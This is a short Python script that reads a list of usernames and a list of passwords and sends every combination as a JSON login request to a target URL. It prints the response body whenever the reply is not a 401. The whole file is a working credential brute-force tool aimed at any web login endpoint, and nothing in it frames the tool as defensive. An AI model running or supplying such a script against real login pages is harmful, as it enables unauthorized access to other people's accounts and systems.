import requests
import argparse
from pathlib import Path
from urllib.parse import urlparse
import sys

def send(url,username,password):

    # Data to send in the request body
    data = {
        "email": username,
        "password": password
    }

    # Optional headers (for example, JSON content type)
    headers = {
        "Content-Type": "application/json"
    }

    # Send the POST request
    response = requests.post(url, json=data, headers=headers)

    # Print the response status code and body
    print("Status Code:", response.status_code)
    if(response.status_code != 401):
        print("Response Body:", response.text)

def is_valid_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        return parsed.scheme in ("http", "https") and bool(parsed.netloc)
    except Exception:
        return False
    
def load_lines(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]

    parser = argparse.ArgumentParser(
        description="Example script that accepts host, username file and password file.",
        add_help=False,  # we'll provide a custom --help so we can use -h for host
    )

    # Custom help flag (long form). Leave out -h from argparse default so we can use it for host.
    parser.add_argument("--help", action="help", help="show this help message and exit")

    # Add -h as host (since user requested that short form)
    parser.add_argument("-h", "--host", dest="host", required=True,
                        help="Target host URL (e.g. http://example.com)")

    parser.add_argument("-u", "--user-file", dest="user_file", required=True,
                        help="Path to username file (one username per line)")

    parser.add_argument("-p", "--pass-file", dest="pass_file", required=True,
                        help="Path to password file (one password per line)")

    args = parser.parse_args(argv)

    host = args.host

    # Validate URL
    if not is_valid_url(args.host):
        parser.error(f"Invalid host URL: {args.host}")

    user_path = Path(args.user_file)
    pass_path = Path(args.pass_file)

    file_username = load_lines(user_path)
    file_password = load_lines(pass_path)

    for user in file_username:
        for password in file_password:
            send(host,user,password)

    return 0

if __name__ == "__main__":
    raise SystemExit(main())

